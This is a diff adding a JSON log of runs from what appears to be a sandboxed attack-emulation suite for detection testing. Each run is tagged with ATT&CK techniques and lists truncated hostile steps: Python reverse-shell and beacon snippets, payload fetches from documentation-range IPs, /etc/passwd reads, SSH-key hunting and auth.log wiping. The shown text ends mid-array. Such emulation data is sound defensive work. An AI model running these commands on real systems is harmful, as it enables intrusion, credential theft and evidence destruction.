@@ -1,0 +1,1401 @@
+{
+ "version": 1,
+ "runs": [
+  {
+   "scenario": "exfil_dns_tunnel",
+   "tactic": "exfiltration",
+   "techniques": [
+    "T1048.003",
+    "T1071.004"
+   ],
+   "seed": 523794613,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-4-suite-exfil_dns_tunnel",
+   "start_ns": 1793725954460391301,
+   "end_ns": 1793725954495095854,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-4-suite-exfil_dns_tunnel",
+    "/var/lib/pdp/sandbox/d1736035200000000000-4-suite-exfil_dns_tunnel/.local/bin/resolvconf-helper",
+    "198.51.100.131 53"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-4-suite-exfil_dns_tunnel/.local/bin/resolvconf-helper -c import socket,base64\n"
+   ]
+  },
+  {
+   "scenario": "credential_access",
+   "tactic": "credential-access",
+   "techniques": [
+    "T1003.008",
+    "T1552.004"
+   ],
+   "seed": 698371045,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-5-suite-credential_access",
+   "start_ns": 1793725954634102330,
+   "end_ns": 1793725954636589803,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-5-suite-credential_access",
+    "/var/lib/pdp/sandbox/d1736035200000000000-5-suite-credential_access/.cache/w6yvp6x/loot.txt"
+   ],
+   "steps": [
+    "/usr/bin/find /var/lib/pdp/sandbox/d1736035200000000000-5-suite-credential_access/home -name id_*"
+   ]
+  },
+  {
+   "scenario": "masquerade_and_cleanup",
+   "tactic": "defense-evasion",
+   "techniques": [
+    "T1036.005",
+    "T1070.004"
+   ],
+   "seed": 410313446,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-7-suite-masquerade_and_cleanup",
+   "start_ns": 1793725959136057577,
+   "end_ns": 1793725959144956855,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-7-suite-masquerade_and_cleanup",
+    "/var/lib/pdp/sandbox/d1736035200000000000-7-suite-masquerade_and_cleanup/var/tmp/udevadm-sync"
+   ],
+   "steps": [
+    "/bin/cp /bin/sh /var/lib/pdp/sandbox/d1736035200000000000-7-suite-masquerade_and_cleanup/var/tmp/udevadm-sync",
+    "/var/lib/pdp/sandbox/d1736035200000000000-7-suite-masquerade_and_cleanup/var/tmp/udevadm-sync -c cat /etc/hostname >/dev",
+    "/bin/sh -c : > /var/lib/pdp/sandbox/d1736035200000000000-7-suite-masquerade_and_cleanup/var/log/auth.log; rm -f /var/lib"
+   ]
+  },
+  {
+   "scenario": "discovery",
+   "tactic": "discovery",
+   "techniques": [
+    "T1082",
+    "T1033",
+    "T1057",
+    "T1049"
+   ],
+   "seed": 476105495,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-8-suite-discovery",
+   "start_ns": 1793725959379476577,
+   "end_ns": 1793725959607016285,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-8-suite-discovery",
+    "/var/lib/pdp/sandbox/d1736035200000000000-8-suite-discovery/.538d.log",
+    "192.0.2.127 31337"
+   ],
+   "steps": [
+    "/bin/cat /proc/version",
+    "/bin/cat /proc/cpuinfo",
+    "/bin/ls -la /home",
+    "/usr/bin/id",
+    "/usr/bin/whoami",
+    "/bin/cat /etc/hosts",
+    "/bin/cat /proc/net/tcp",
+    "/bin/uname -a",
+    "tcp 192.0.2.127:31337"
+   ]
+  },
+  {
+   "scenario": "ransomware",
+   "tactic": "impact",
+   "techniques": [
+    "T1486",
+    "T1083"
+   ],
+   "seed": 512423803,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-9-suite-ransomware",
+   "start_ns": 1793725959780886348,
+   "end_ns": 1793725960005933647,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-9-suite-ransomware",
+    "/var/lib/pdp/sandbox/d1736035200000000000-9-suite-ransomware/.local/bin/kworker-x",
+    "/var/lib/pdp/sandbox/d1736035200000000000-9-suite-ransomware/home/u778o/Pictures/README_RESTORE.txt",
+    "/var/lib/pdp/sandbox/d1736035200000000000-9-suite-ransomware/tmp/kworker",
+    "192.0.2.59 443"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-9-suite-ransomware/tmp/kworker",
+    "/var/lib/pdp/sandbox/d1736035200000000000-9-suite-ransomware/.local/bin/kworker-x -c import os\nfor p in ['/var/lib/pdp/s",
+    "tcp 192.0.2.59:443"
+   ]
+  },
+  {
+   "scenario": "web_shell",
+   "tactic": "initial-access/persistence",
+   "techniques": [
+    "T1190",
+    "T1505.003",
+    "T1059.004"
+   ],
+   "seed": 306004377,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-10-suite-web_shell",
+   "start_ns": 1793725964920604491,
+   "end_ns": 1793725965128871933,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-10-suite-web_shell",
+    "/var/lib/pdp/sandbox/d1736035200000000000-10-suite-web_shell/www/.out",
+    "/var/lib/pdp/sandbox/d1736035200000000000-10-suite-web_shell/www/static/lc2v7.php",
+    "203.0.113.205 8080"
+   ],
+   "steps": [
+    "/bin/sh -c cat /etc/passwd; whoami; uname -a; ls -la / > /var/lib/pdp/sandbox/d1736035200000000000-10-suite-web_shell/ww",
+    "tcp 203.0.113.205:8080"
+   ]
+  },
+  {
+   "scenario": "staged_exfiltration",
+   "tactic": "collection/exfiltration",
+   "techniques": [
+    "T1005",
+    "T1074.001",
+    "T1560.001",
+    "T1041"
+   ],
+   "seed": 962007330,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-11-suite-staged_exfiltration",
+   "start_ns": 1793725965373312634,
+   "end_ns": 1793725966585952966,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-11-suite-staged_exfiltration",
+    "/var/lib/pdp/sandbox/d1736035200000000000-11-suite-staged_exfiltration/tmp/.4s5r5.tar",
+    "/var/lib/pdp/sandbox/d1736035200000000000-11-suite-staged_exfiltration/tmp/.4s5r5.tar.gz",
+    "198.51.100.194 29789"
+   ],
+   "steps": [
+    "/bin/tar cf /var/lib/pdp/sandbox/d1736035200000000000-11-suite-staged_exfiltration/tmp/.4s5r5.tar /var/lib/pdp/sandbox/d",
+    "/bin/gzip -f /var/lib/pdp/sandbox/d1736035200000000000-11-suite-staged_exfiltration/tmp/.4s5r5.tar",
+    "tcp 198.51.100.194:29789",
+    "tcp 198.51.100.194:29789",
+    "tcp 198.51.100.194:29789",
+    "tcp 198.51.100.194:29789",
+    "tcp 198.51.100.194:29789",
+    "tcp 198.51.100.194:29789"
+   ]
+  },
+  {
+   "scenario": "reverse_shell",
+   "tactic": "execution/c2",
+   "techniques": [
+    "T1059.004",
+    "T1071"
+   ],
+   "seed": 195884769,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-12-suite-reverse_shell",
+   "start_ns": 1793725966781182458,
+   "end_ns": 1793725967049233182,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-12-suite-reverse_shell",
+    "/var/lib/pdp/sandbox/d1736035200000000000-12-suite-reverse_shell/.local/bin/bash",
+    "198.51.100.213 53"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-12-suite-reverse_shell/.local/bin/bash -c import socket,subprocess;s=socket.so"
+   ]
+  },
+  {
+   "scenario": "ingress_tool_transfer",
+   "tactic": "command-and-control",
+   "techniques": [
+    "T1105"
+   ],
+   "seed": 172756072,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-13-suite-ingress_tool_transfer",
+   "start_ns": 1793725970879853208,
+   "end_ns": 1793725971144136948,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-13-suite-ingress_tool_transfer",
+    "/var/lib/pdp/sandbox/d1736035200000000000-13-suite-ingress_tool_transfer/tmp/.wj9rwq",
+    "198.51.100.212 53"
+   ],
+   "steps": [
+    "/opt/venv/bin/python -c import urllib.request,os\ntry: urllib.request.urlopen('http://198.51.100.212:53/t', timeout=0.2)\n"
+   ]
+  },
+  {
+   "scenario": "masquerade_and_cleanup",
+   "tactic": "defense-evasion",
+   "techniques": [
+    "T1036.005",
+    "T1070.004"
+   ],
+   "seed": 687312017,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-14-suite-masquerade_and_cleanup",
+   "start_ns": 1793725971336600227,
+   "end_ns": 1793725971345273764,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-14-suite-masquerade_and_cleanup",
+    "/var/lib/pdp/sandbox/d1736035200000000000-14-suite-masquerade_and_cleanup/.cache/udevadm-sync"
+   ],
+   "steps": [
+    "/bin/cp /bin/sh /var/lib/pdp/sandbox/d1736035200000000000-14-suite-masquerade_and_cleanup/.cache/udevadm-sync",
+    "/var/lib/pdp/sandbox/d1736035200000000000-14-suite-masquerade_and_cleanup/.cache/udevadm-sync -c cat /etc/hostname >/dev",
+    "/bin/sh -c : > /var/lib/pdp/sandbox/d1736035200000000000-14-suite-masquerade_and_cleanup/var/log/auth.log; rm -f /var/li"
+   ]
+  },
+  {
+   "scenario": "persistence_cron",
+   "tactic": "persistence",
+   "techniques": [
+    "T1053.003"
+   ],
+   "seed": 234199944,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-16-suite-persistence_cron",
+   "start_ns": 1793725976267769209,
+   "end_ns": 1793725976268185354,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-16-suite-persistence_cron",
+    "/var/lib/pdp/sandbox/d1736035200000000000-16-suite-persistence_cron/etc/cron.d/0hourly",
+    "/var/lib/pdp/sandbox/d1736035200000000000-16-suite-persistence_cron/tmp/systemd-updater"
+   ],
+   "steps": []
+  },
+  {
+   "scenario": "persistence_ssh_key",
+   "tactic": "persistence",
+   "techniques": [
+    "T1098.004"
+   ],
+   "seed": 625112449,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-18-suite-persistence_ssh_key",
+   "start_ns": 1793725980702344041,
+   "end_ns": 1793725980706094141,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-18-suite-persistence_ssh_key",
+    "/var/lib/pdp/sandbox/d1736035200000000000-18-suite-persistence_ssh_key/root/.ssh/authorized_keys"
+   ],
+   "steps": [
+    "/bin/chmod 600 /var/lib/pdp/sandbox/d1736035200000000000-18-suite-persistence_ssh_key/root/.ssh/authorized_keys"
+   ]
+  },
+  {
+   "scenario": "interpreter_beacon",
+   "tactic": "command-and-control",
+   "techniques": [
+    "T1059.006",
+    "T1071.001",
+    "T1029"
+   ],
+   "seed": 268028964,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-19-suite-interpreter_beacon",
+   "start_ns": 1793725980864021792,
+   "end_ns": 1793725982281563469,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-19-suite-interpreter_beacon",
+    "/var/lib/pdp/sandbox/d1736035200000000000-19-suite-interpreter_beacon/.local/bin/cron-check",
+    "198.51.100.195 443"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-19-suite-interpreter_beacon/.local/bin/cron-check -c import socket,subprocess,"
+   ]
+  },
+  {
+   "scenario": "drop_and_execute",
+   "tactic": "execution",
+   "techniques": [
+    "T1105",
+    "T1204.002",
+    "T1059.004"
+   ],
+   "seed": 436372654,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-21-suite-drop_and_execute",
+   "start_ns": 1793725987575666010,
+   "end_ns": 1793725988063292648,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-21-suite-drop_and_execute",
+    "/var/lib/pdp/sandbox/d1736035200000000000-21-suite-drop_and_execute/.local/bin/kworker",
+    "203.0.113.32 1337"
+   ],
+   "steps": [
+    "tcp 203.0.113.32:1337",
+    "/bin/chmod +x /var/lib/pdp/sandbox/d1736035200000000000-21-suite-drop_and_execute/.local/bin/kworker",
+    "/var/lib/pdp/sandbox/d1736035200000000000-21-suite-drop_and_execute/.local/bin/kworker"
+   ]
+  },
+  {
+   "scenario": "exfil_dns_tunnel",
+   "tactic": "exfiltration",
+   "techniques": [
+    "T1048.003",
+    "T1071.004"
+   ],
+   "seed": 955606658,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-23-suite-exfil_dns_tunnel",
+   "start_ns": 1793725988712781792,
+   "end_ns": 1793725988744732435,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-23-suite-exfil_dns_tunnel",
+    "/var/lib/pdp/sandbox/d1736035200000000000-23-suite-exfil_dns_tunnel/.local/bin/v3lr32",
+    "192.0.2.9 53"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-23-suite-exfil_dns_tunnel/.local/bin/v3lr32 -c import socket,base64\nd=base64.b"
+   ]
+  },
+  {
+   "scenario": "discovery",
+   "tactic": "discovery",
+   "techniques": [
+    "T1082",
+    "T1033",
+    "T1057",
+    "T1049"
+   ],
+   "seed": 196778422,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-24-suite-discovery",
+   "start_ns": 1793725988882043622,
+   "end_ns": 1793725989135830629,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-24-suite-discovery",
+    "/var/lib/pdp/sandbox/d1736035200000000000-24-suite-discovery/.i9ts.log",
+    "203.0.113.107 41752"
+   ],
+   "steps": [
+    "/bin/cat /proc/net/tcp",
+    "/bin/cat /proc/version",
+    "/bin/cat /etc/hosts",
+    "/usr/bin/whoami",
+    "/bin/cat /proc/cpuinfo",
+    "/bin/ps -ef",
+    "/bin/ls -la /home",
+    "/bin/uname -a",
+    "tcp 203.0.113.107:41752"
+   ]
+  },
+  {
+   "scenario": "privesc_discovery",
+   "tactic": "privilege-escalation",
+   "techniques": [
+    "T1548.001"
+   ],
+   "seed": 826568914,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-25-suite-privesc_discovery",
+   "start_ns": 1793725993334870376,
+   "end_ns": 1793725993342790678,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-25-suite-privesc_discovery",
+    "/var/lib/pdp/sandbox/d1736035200000000000-25-suite-privesc_discovery/.3zcof/suid.txt"
+   ],
+   "steps": [
+    "/bin/sh -c find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null > /var/lib/pdp/sandbox/d1736035200000000000-25-suite-"
+   ]
+  },
+  {
+   "scenario": "persistence_ssh_key",
+   "tactic": "persistence",
+   "techniques": [
+    "T1098.004"
+   ],
+   "seed": 519921156,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-27-suite-persistence_ssh_key",
+   "start_ns": 1793725993789035046,
+   "end_ns": 1793725993790681449,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-27-suite-persistence_ssh_key",
+    "/var/lib/pdp/sandbox/d1736035200000000000-27-suite-persistence_ssh_key/root/.ssh/authorized_keys"
+   ],
+   "steps": [
+    "/bin/chmod 600 /var/lib/pdp/sandbox/d1736035200000000000-27-suite-persistence_ssh_key/root/.ssh/authorized_keys"
+   ]
+  },
+  {
+   "scenario": "lateral_movement",
+   "tactic": "lateral-movement",
+   "techniques": [
+    "T1021.004",
+    "T1570"
+   ],
+   "seed": 623477862,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-28-suite-lateral_movement",
+   "start_ns": 1793725993884366930,
+   "end_ns": 1793725994488541404,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-28-suite-lateral_movement",
+    "/var/lib/pdp/sandbox/d1736035200000000000-28-suite-lateral_movement/tmp/kworker",
+    "198.51.100.120 3389",
+    "198.51.100.175 5985",
+    "198.51.100.72 139"
+   ],
+   "steps": [
+    "/bin/cp /bin/ls /var/lib/pdp/sandbox/d1736035200000000000-28-suite-lateral_movement/tmp/kworker",
+    "tcp 198.51.100.72:139",
+    "tcp 198.51.100.120:3389",
+    "tcp 198.51.100.175:5985"
+   ]
+  },
+  {
+   "scenario": "web_shell",
+   "tactic": "initial-access/persistence",
+   "techniques": [
+    "T1190",
+    "T1505.003",
+    "T1059.004"
+   ],
+   "seed": 394855082,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-29-suite-web_shell",
+   "start_ns": 1793725994655261488,
+   "end_ns": 1793725994888526230,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-29-suite-web_shell",
+    "/var/lib/pdp/sandbox/d1736035200000000000-29-suite-web_shell/www/.out",
+    "/var/lib/pdp/sandbox/d1736035200000000000-29-suite-web_shell/www/img/i3azx.php",
+    "203.0.113.77 1337"
+   ],
+   "steps": [
+    "/bin/sh -c id; ps aux; cat /etc/passwd > /var/lib/pdp/sandbox/d1736035200000000000-29-suite-web_shell/www/.out 2>&1",
+    "tcp 203.0.113.77:1337"
+   ]
+  },
+  {
+   "scenario": "persistence_cron",
+   "tactic": "persistence",
+   "techniques": [
+    "T1053.003"
+   ],
+   "seed": 406714771,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-30-suite-persistence_cron",
+   "start_ns": 1793726011494691212,
+   "end_ns": 1793726011494868285,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-30-suite-persistence_cron",
+    "/var/lib/pdp/sandbox/d1736035200000000000-30-suite-persistence_cron/.cache/snapd-agent",
+    "/var/lib/pdp/sandbox/d1736035200000000000-30-suite-persistence_cron/etc/cron.d/sysstat2"
+   ],
+   "steps": []
+  },
+  {
+   "scenario": "lateral_movement",
+   "tactic": "lateral-movement",
+   "techniques": [
+    "T1021.004",
+    "T1570"
+   ],
+   "seed": 400998618,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-31-suite-lateral_movement",
+   "start_ns": 1793726024477290657,
+   "end_ns": 1793726025884075546,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-31-suite-lateral_movement",
+    "/var/lib/pdp/sandbox/d1736035200000000000-31-suite-lateral_movement/tmp/polkit-auth",
+    "198.51.100.108 445",
+    "198.51.100.36 445",
+    "198.51.100.65 3389",
+    "198.51.100.83 22",
+    "203.0.113.119 22",
+    "203.0.113.150 22",
+    "203.0.113.216 5985",
+    "203.0.113.252 445"
+   ],
+   "steps": [
+    "/bin/cp /bin/ls /var/lib/pdp/sandbox/d1736035200000000000-31-suite-lateral_movement/tmp/polkit-auth",
+    "tcp 203.0.113.216:5985",
+    "tcp 198.51.100.83:22",
+    "tcp 198.51.100.65:3389",
+    "tcp 198.51.100.36:445",
+    "tcp 203.0.113.252:445",
+    "tcp 203.0.113.150:22",
+    "tcp 198.51.100.108:445",
+    "tcp 203.0.113.119:22"
+   ]
+  },
+  {
+   "scenario": "drop_and_execute",
+   "tactic": "execution",
+   "techniques": [
+    "T1105",
+    "T1204.002",
+    "T1059.004"
+   ],
+   "seed": 70807726,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-32-suite-drop_and_execute",
+   "start_ns": 1793726026027019726,
+   "end_ns": 1793726026493398883,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-32-suite-drop_and_execute",
+    "/var/lib/pdp/sandbox/d1736035200000000000-32-suite-drop_and_execute/.X11-unix/dbus-helper",
+    "192.0.2.114 443"
+   ],
+   "steps": [
+    "tcp 192.0.2.114:443",
+    "/bin/chmod +x /var/lib/pdp/sandbox/d1736035200000000000-32-suite-drop_and_execute/.X11-unix/dbus-helper",
+    "/var/lib/pdp/sandbox/d1736035200000000000-32-suite-drop_and_execute/.X11-unix/dbus-helper"
+   ]
+  },
+  {
+   "scenario": "interpreter_beacon",
+   "tactic": "command-and-control",
+   "techniques": [
+    "T1059.006",
+    "T1071.001",
+    "T1029"
+   ],
+   "seed": 1023342526,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-34-suite-interpreter_beacon",
+   "start_ns": 1793726031204669206,
+   "end_ns": 1793726031922493099,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-34-suite-interpreter_beacon",
+    "/var/lib/pdp/sandbox/d1736035200000000000-34-suite-interpreter_beacon/.local/bin/udevadm-sync",
+    "203.0.113.192 443"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-34-suite-interpreter_beacon/.local/bin/udevadm-sync -c import socket,subproces"
+   ]
+  },
+  {
+   "scenario": "credential_access",
+   "tactic": "credential-access",
+   "techniques": [
+    "T1003.008",
+    "T1552.004"
+   ],
+   "seed": 148359454,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-35-suite-credential_access",
+   "start_ns": 1793726032030111938,
+   "end_ns": 1793726032035708423,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-35-suite-credential_access",
+    "/var/lib/pdp/sandbox/d1736035200000000000-35-suite-credential_access/.cache/w0lyi5i/loot.txt"
+   ],
+   "steps": [
+    "/usr/bin/find /var/lib/pdp/sandbox/d1736035200000000000-35-suite-credential_access/home -name id_*"
+   ]
+  },
+  {
+   "scenario": "ingress_tool_transfer",
+   "tactic": "command-and-control",
+   "techniques": [
+    "T1105"
+   ],
+   "seed": 279654869,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-37-suite-ingress_tool_transfer",
+   "start_ns": 1793726037220414164,
+   "end_ns": 1793726037491142018,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-37-suite-ingress_tool_transfer",
+    "/var/lib/pdp/sandbox/d1736035200000000000-37-suite-ingress_tool_transfer/tmp/.h3gibn",
+    "198.51.100.40 8080"
+   ],
+   "steps": [
+    "/opt/venv/bin/python -c import urllib.request,os\ntry: urllib.request.urlopen('http://198.51.100.40:8080/t', timeout=0.2)"
+   ]
+  },
+  {
+   "scenario": "cryptominer",
+   "tactic": "impact",
+   "techniques": [
+    "T1496"
+   ],
+   "seed": 321156892,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-38-suite-cryptominer",
+   "start_ns": 1793726037625896178,
+   "end_ns": 1793726038194467568,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-38-suite-cryptominer",
+    "/var/lib/pdp/sandbox/d1736035200000000000-38-suite-cryptominer/.local/bin/kswapd0",
+    "192.0.2.153 5555"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-38-suite-cryptominer/.local/bin/kswapd0 -c import socket,time\nt=time.time()\nwh"
+   ]
+  },
+  {
+   "scenario": "staged_exfiltration",
+   "tactic": "collection/exfiltration",
+   "techniques": [
+    "T1005",
+    "T1074.001",
+    "T1560.001",
+    "T1041"
+   ],
+   "seed": 172331948,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-40-suite-staged_exfiltration",
+   "start_ns": 1793726042456018829,
+   "end_ns": 1793726043663189332,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-40-suite-staged_exfiltration",
+    "/var/lib/pdp/sandbox/d1736035200000000000-40-suite-staged_exfiltration/tmp/.fnaet.tar",
+    "/var/lib/pdp/sandbox/d1736035200000000000-40-suite-staged_exfiltration/tmp/.fnaet.tar.gz",
+    "192.0.2.106 8080"
+   ],
+   "steps": [
+    "/bin/tar cf /var/lib/pdp/sandbox/d1736035200000000000-40-suite-staged_exfiltration/tmp/.fnaet.tar /var/lib/pdp/sandbox/d",
+    "/bin/gzip -f /var/lib/pdp/sandbox/d1736035200000000000-40-suite-staged_exfiltration/tmp/.fnaet.tar",
+    "tcp 192.0.2.106:8080",
+    "tcp 192.0.2.106:8080",
+    "tcp 192.0.2.106:8080",
+    "tcp 192.0.2.106:8080",
+    "tcp 192.0.2.106:8080",
+    "tcp 192.0.2.106:8080"
+   ]
+  },
+  {
+   "scenario": "privesc_discovery",
+   "tactic": "privilege-escalation",
+   "techniques": [
+    "T1548.001"
+   ],
+   "seed": 840301857,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-41-suite-privesc_discovery",
+   "start_ns": 1793726043798057602,
+   "end_ns": 1793726043809721461,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-41-suite-privesc_discovery",
+    "/var/lib/pdp/sandbox/d1736035200000000000-41-suite-privesc_discovery/.x64ca/suid.txt"
+   ],
+   "steps": [
+    "/bin/sh -c find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null > /var/lib/pdp/sandbox/d1736035200000000000-41-suite-"
+   ]
+  },
+  {
+   "scenario": "cryptominer",
+   "tactic": "impact",
+   "techniques": [
+    "T1496"
+   ],
+   "seed": 591919774,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-42-suite-cryptominer",
+   "start_ns": 1793726043870282303,
+   "end_ns": 1793726044435522762,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-42-suite-cryptominer",
+    "/var/lib/pdp/sandbox/d1736035200000000000-42-suite-cryptominer/.local/bin/kdevtmpfsi",
+    "198.51.100.155 3333"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-42-suite-cryptominer/.local/bin/kdevtmpfsi -c import socket,time\nt=time.time()"
+   ]
+  },
+  {
+   "scenario": "reverse_shell",
+   "tactic": "execution/c2",
+   "techniques": [
+    "T1059.004",
+    "T1071"
+   ],
+   "seed": 505736119,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-43-suite-reverse_shell",
+   "start_ns": 1793726049755661765,
+   "end_ns": 1793726050023385491,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-43-suite-reverse_shell",
+    "/var/lib/pdp/sandbox/d1736035200000000000-43-suite-reverse_shell/.local/bin/bash",
+    "192.0.2.123 53"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-43-suite-reverse_shell/.local/bin/bash -c import socket,subprocess;s=socket.so"
+   ]
+  },
+  {
+   "scenario": "ransomware",
+   "tactic": "impact",
+   "techniques": [
+    "T1486",
+    "T1083"
+   ],
+   "seed": 462141250,
+   "root": "/var/lib/pdp/sandbox/d1736035200000000000-44-suite-ransomware",
+   "start_ns": 1793726050234373862,
+   "end_ns": 1793726050455836068,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-44-suite-ransomware",
+    "/var/lib/pdp/sandbox/d1736035200000000000-44-suite-ransomware/.local/bin/kworker-x",
+    "/var/lib/pdp/sandbox/d1736035200000000000-44-suite-ransomware/home/gfyi5/Pictures/README_RESTORE.txt",
+    "/var/lib/pdp/sandbox/d1736035200000000000-44-suite-ransomware/tmp/kworker",
+    "198.51.100.195 4444"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736035200000000000-44-suite-ransomware/tmp/kworker",
+    "/var/lib/pdp/sandbox/d1736035200000000000-44-suite-ransomware/.local/bin/kworker-x -c import os\nfor p in ['/var/lib/pdp/",
+    "tcp 198.51.100.195:4444"
+   ]
+  },
+  {
+   "scenario": "web_shell",
+   "tactic": "initial-access/persistence",
+   "techniques": [
+    "T1190",
+    "T1505.003",
+    "T1059.004"
+   ],
+   "seed": 967576896,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-2-suite-web_shell",
+   "start_ns": 1793726054398603219,
+   "end_ns": 1793726054607132006,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-2-suite-web_shell",
+    "/var/lib/pdp/sandbox/d1736121600000000000-2-suite-web_shell/www/.out",
+    "/var/lib/pdp/sandbox/d1736121600000000000-2-suite-web_shell/www/img/6e391.php",
+    "203.0.113.135 34795"
+   ],
+   "steps": [
+    "/bin/sh -c hostname; uname -a; cat /etc/passwd; whoami > /var/lib/pdp/sandbox/d1736121600000000000-2-suite-web_shell/www",
+    "tcp 203.0.113.135:34795"
+   ]
+  },
+  {
+   "scenario": "credential_access",
+   "tactic": "credential-access",
+   "techniques": [
+    "T1003.008",
+    "T1552.004"
+   ],
+   "seed": 1057969378,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-3-suite-credential_access",
+   "start_ns": 1793726054733129491,
+   "end_ns": 1793726054736132822,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-3-suite-credential_access",
+    "/var/lib/pdp/sandbox/d1736121600000000000-3-suite-credential_access/.cache/vn8sy8f/loot.txt"
+   ],
+   "steps": [
+    "/usr/bin/find /var/lib/pdp/sandbox/d1736121600000000000-3-suite-credential_access/home -name id_*"
+   ]
+  },
+  {
+   "scenario": "exfil_dns_tunnel",
+   "tactic": "exfiltration",
+   "techniques": [
+    "T1048.003",
+    "T1071.004"
+   ],
+   "seed": 767440973,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-4-suite-exfil_dns_tunnel",
+   "start_ns": 1793726058631002025,
+   "end_ns": 1793726058664497545,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-4-suite-exfil_dns_tunnel",
+    "/var/lib/pdp/sandbox/d1736121600000000000-4-suite-exfil_dns_tunnel/.local/bin/dnsd",
+    "203.0.113.80 53"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-4-suite-exfil_dns_tunnel/.local/bin/dnsd -c import socket,base64\nd=base64.b32e"
+   ]
+  },
+  {
+   "scenario": "ingress_tool_transfer",
+   "tactic": "command-and-control",
+   "techniques": [
+    "T1105"
+   ],
+   "seed": 176894648,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-5-suite-ingress_tool_transfer",
+   "start_ns": 1793726058829934738,
+   "end_ns": 1793726059100026300,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-5-suite-ingress_tool_transfer",
+    "/var/lib/pdp/sandbox/d1736121600000000000-5-suite-ingress_tool_transfer/.cache/.ndox7o",
+    "192.0.2.172 443"
+   ],
+   "steps": [
+    "/opt/venv/bin/python -c import urllib.request,os\ntry: urllib.request.urlopen('http://192.0.2.172:443/t', timeout=0.2)\nex"
+   ]
+  },
+  {
